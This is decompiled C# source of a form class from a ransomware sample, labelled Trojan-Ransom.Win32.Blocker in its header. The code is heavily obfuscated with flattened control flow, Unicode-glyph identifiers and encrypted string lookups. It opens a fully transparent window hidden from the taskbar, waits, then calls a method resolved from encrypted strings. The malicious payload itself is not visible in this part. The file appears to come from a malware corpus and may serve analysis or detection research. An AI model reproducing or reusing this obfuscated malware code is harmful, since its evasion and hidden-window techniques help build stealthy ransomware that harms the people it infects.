// Decompiled with JetBrains decompiler
// Type: Final.Form1
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Final.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Final
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private Ⴃ.Ⴅ.ႳႥ Ⴈ;

    public Form1()
    {
      Form1.Ⴗ((Form) this, new EventHandler(this.Ⴈ), 400, 411);
      this.Ⴄ();
    }

    protected override void Dispose(bool disposing)
    {
      try
      {
        int num = 6;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = this.Ⴈ.Ⴀ == null ? 3 : 4;
              continue;
            case 1:
              goto label_5;
            case 2:
              goto label_7;
            case 3:
              goto label_8;
            case 4:
              goto label_4;
            case 5:
              goto label_9;
            default:
              num = !disposing ? 3 : 0;
              continue;
          }
        }
label_5:
        return;
label_7:
        return;
label_8:
        return;
label_9:
        return;
label_4:
        this.Ⴈ.Ⴀ.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    private void Ⴄ()
    {
      int num = 13;
      Point point1;
      Size size1;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = 11;
            continue;
          case 1:
            Ⴃ.Ⴈ.Ⴓ.Ⴃ((Control) this.Ⴃ(), 1, 202, 201);
            Ⴃ.Ⴃ.Ⴜ(this.Ⴃ(), MyComputer.Ⴈ(307275436, 3), 375, 357);
            num = 2;
            continue;
          case 2:
            MyApplication.Ⴗ((ContainerControl) this, new SizeF(6f, 13f), 700, 666);
            goto case 0;
          case 3:
            Label label1 = this.Ⴃ();
            point1 = new Point(62, 27);
            Point point2 = point1;
            MyApplication.Ⴄ((Control) label1, point2, 843, 821);
            num = 8;
            continue;
          case 4:
            Ⴃ.Ⴈ.Ⴓ.Ⴃ((Control) this.Ⴈ(), 0, 788, 791);
            Ⴃ.Ⴃ.Ⴓ(this.Ⴃ(), true, 941, 962);
            num = 3;
            continue;
          case 5:
            this.Controls.Add((Control) this.Ⴃ());
            this.Controls.Add((Control) this.Ⴈ());
            goto case 6;
          case 6:
            num = 9;
            continue;
          case 7:
            num = 12;
            continue;
          case 8:
            Ⴃ.Ⴃ.Ⴗ((Control) this.Ⴃ(), MyComputer.Ⴈ(307275437, 2), 222, 173);
            Label label2 = this.Ⴃ();
            size1 = new Size(39, 13);
            Size size2 = size1;
            Ⴃ.Ⴅ.ႳႨ((Control) label2, size2, 93, 0);
            num = 1;
            continue;
          case 9:
            this.Name = MyComputer.Ⴈ(307275413, 1);
            this.Opacity = 0.0;
            this.ResumeLayout(false);
            num = 14;
            continue;
          case 10:
            ProgressBar progressBar1 = this.Ⴈ();
            point1 = new Point(13, 75);
            Point point3 = point1;
            MyApplication.Ⴄ((Control) progressBar1, point3, 138, 244);
            goto case 7;
          case 11:
            this.AutoScaleMode = AutoScaleMode.Font;
            size1 = new Size(286, 98);
            this.ClientSize = size1;
            num = 5;
            continue;
          case 12:
            Ⴃ.Ⴃ.Ⴗ((Control) this.Ⴈ(), MyComputer.Ⴈ(307275451, 7), 642, 753);
            ProgressBar progressBar2 = this.Ⴈ();
            size1 = new Size(261, 11);
            Size size3 = size1;
            Ⴃ.Ⴅ.ႳႨ((Control) progressBar2, size3, 757, 680);
            num = 4;
            continue;
          case 14:
            goto label_16;
          default:
            this.Ⴅ(new ProgressBar());
            this.Ⴐ(new Label());
            Ⴃ.Ⴅ.ႳႳ((Control) this, 903, 957);
            num = 10;
            continue;
        }
      }
label_16:
      this.PerformLayout();
    }

    [SpecialName]
    internal virtual ProgressBar Ⴈ() => this.Ⴈ.Ⴍ;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void Ⴅ(ProgressBar Ⴈ) => this.Ⴈ.Ⴍ = Ⴈ;

    [SpecialName]
    internal virtual Label Ⴃ() => this.Ⴈ.Ⴅ;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void Ⴐ(Label Ⴀ) => this.Ⴈ.Ⴅ = Ⴀ;

    public void vuIH5s()
    {
      int num = (int) Ⴃ.Ⴈ.Ⴓ.Ⴀ((object) MyComputer.Ⴈ(307275423, 3), MsgBoxStyle.OkOnly, (object) null, 146, 159);
    }

    private void Ⴈ(object Ⴃ, EventArgs Ⴈ)
    {
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 3:
            Ⴃ.Ⴈ.Ⴓ.Ⴜ((Control) this, false, 466, 434);
            goto case 2;
          case 2:
            num = 4;
            continue;
          case 4:
            goto label_5;
          default:
            Form1.Ⴓ((Form) this, false, 189, 131);
            goto case 1;
        }
      }
label_5:
      this.one();
    }

    public void one()
    {
      Form1.Ⴜ(2000, 156, 233);
      Ⴃ.Ⴈ.Ⴓ.Ⴓ(Ⴃ.Ⴅ.Ⴃ(), MyComputer.Ⴈ(307275300, 1), MyComputer.Ⴈ(307275281, 3), new object[0]);
    }

    static Form1() => MyComputer.ႨႨ();

    internal static System.Type Ⴀ([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 92:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 2:
          case 5:
            num2 = 3;
            continue;
          case 3:
          case 6:
            goto label_3;
          case 4:
            num2 = 3;
            continue;
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Ⴀ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return System.Type.GetTypeFromHandle(obj0);
    }

    internal static bool Ⴍ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 19:
          num1 = 2;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            num2 = 5;
            continue;
          case 1:
          case 2:
            goto label_8;
          case 3:
            num2 = 5;
            continue;
          case 4:
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Ⴍ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return object.ReferenceEquals(obj0, obj1);
    }

    internal static void Ⴗ([In] Form obj0, [In] EventHandler obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            num1 = 4;
            continue;
          case 1:
          case 2:
          case 3:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 11:
                num2 = 1;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Load += obj1;
    }

    internal static void Ⴓ([In] Form obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 1;
            continue;
          case 2:
          case 4:
          case 5:
            goto label_7;
          case 3:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 62:
                num2 = 2;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.ShowInTaskbar = obj1;
    }

    internal static void Ⴜ([In] int obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
          case 5:
            goto label_7;
          case 3:
            num1 = 4;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 117:
                num2 = 1;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Thread.Sleep(obj0);
    }

    internal static string ႥႰ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 47)
      {
        case 0:
          return obj0 + obj1;
        default:
          goto label_0;
      }
    }

    internal static void ႥႥ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 90)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    internal static byte[] ႥႨ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 24)
      {
        case 0:
          return obj0.ToArray();
        default:
          goto label_0;
      }
    }
  }
}
